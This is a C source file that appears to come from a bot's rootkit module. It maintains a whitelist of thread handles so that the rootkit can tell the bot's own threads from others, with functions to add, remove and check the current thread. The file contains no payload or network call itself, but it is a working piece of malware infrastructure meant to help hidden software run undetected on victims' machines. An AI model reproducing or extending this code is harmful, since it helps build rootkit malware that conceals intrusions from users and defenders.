#include "botThreads.h"

#ifdef MODULE_ROOTKIT
#include "../common/mem.h"

static HANDLE* phThreads = NULL;
static DWORD dwThreadCount = 0;

extern bot_t bot;

void WINAPI AddWhitelistCurrentThread(void)
{
	HANDLE* phThread = NULL;
	DWORD dwIndex, i;
	HANDLE hThread = bot.api.pGetCurrentThread();

	dwIndex = -1;

	for (i = 0; i < dwThreadCount; i++)
	{
		if (phThreads[i] == INVALID_HANDLE_VALUE)
		{
			phThread = &phThreads[i];
			dwIndex = i;
			break;
		}
	}

	if (phThread == NULL && memreallocEx(&phThreads, sizeof(HANDLE) * (dwThreadCount + 1)))
	{
		dwIndex = dwThreadCount++;
		phThread = &phThreads[i];
	}

	if(phThread != NULL)
		*phThread = hThread;
}

static DWORD _FindThread()
{
	DWORD i;

	for (i = 0; i < dwThreadCount; i++)
	{
		if (phThreads[i] == bot.api.pGetCurrentThread())
			return i;
	}

	return -1;
}

void WINAPI RemoveWhitelistCurrentThread(void)
{
	DWORD dwIndex, dwNewCount;
	HANDLE* phThread;

	if ((dwIndex = _FindThread()) == -1)
		return;
	
	phThread = &phThreads[dwIndex];
	*phThread = INVALID_HANDLE_VALUE;

	dwNewCount = dwThreadCount;

	while (dwNewCount > 0 && phThreads[dwNewCount - 1] == INVALID_HANDLE_VALUE) dwNewCount--;

	if (dwNewCount != dwThreadCount)
	{
		if (dwNewCount == 0)
		{
			memfree(phThreads);
			phThreads = NULL;
		}
		else memreallocEx(&phThreads, sizeof(HANDLE) * dwNewCount);

		dwThreadCount = dwNewCount;
	}
}

BOOL WINAPI IsCurrentThreadWhitelisted()
{
	return _FindThread() != -1;
}
#endif